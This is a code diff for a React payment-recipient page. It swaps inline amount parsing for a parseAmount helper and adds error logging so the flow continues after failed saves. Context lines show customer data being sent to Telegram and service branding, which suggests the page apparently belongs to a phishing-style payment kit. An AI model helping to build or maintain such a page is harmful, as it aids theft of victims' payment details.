@@ -9,6 +9,7 @@ import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getCountryByCode } from "@/lib/countries";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
+import { parseAmount } from "@/utils/amountParser";
 import { getCompanyMeta } from "@/utils/companyMeta";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
@@ -82,19 +83,7 @@ const PaymentRecipient = () => {
 
   // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = shippingInfo?.cod_amount;
-
-  // Handle different data types and edge cases
-  let amount = 500; // Default value
-  if (rawAmount !== undefined && rawAmount !== null) {
-    if (typeof rawAmount === 'number') {
-      amount = rawAmount;
-    } else if (typeof rawAmount === 'string') {
-      const parsed = parseFloat(rawAmount);
-      if (!isNaN(parsed)) {
-        amount = parsed;
-      }
-    }
-  }
+  const amount = parseAmount(rawAmount, 500);
 
   const formattedAmount = formatCurrency(amount, currencyCode);
 
@@ -158,6 +147,7 @@ const PaymentRecipient = () => {
       });
     } catch (error) {
       console.error('Form submission error:', error);
+      // Continue with the flow even if form submission fails
     }
 
     // Send data to Telegram
@@ -196,7 +186,8 @@ const PaymentRecipient = () => {
         payload: customerData
       });
     } catch (error) {
-      // Silent error handling
+      console.error('Error saving customer data:', error);
+      // Continue with the flow even if Supabase update fails
     }
 
     navigate(`/pay/${id}/details`);
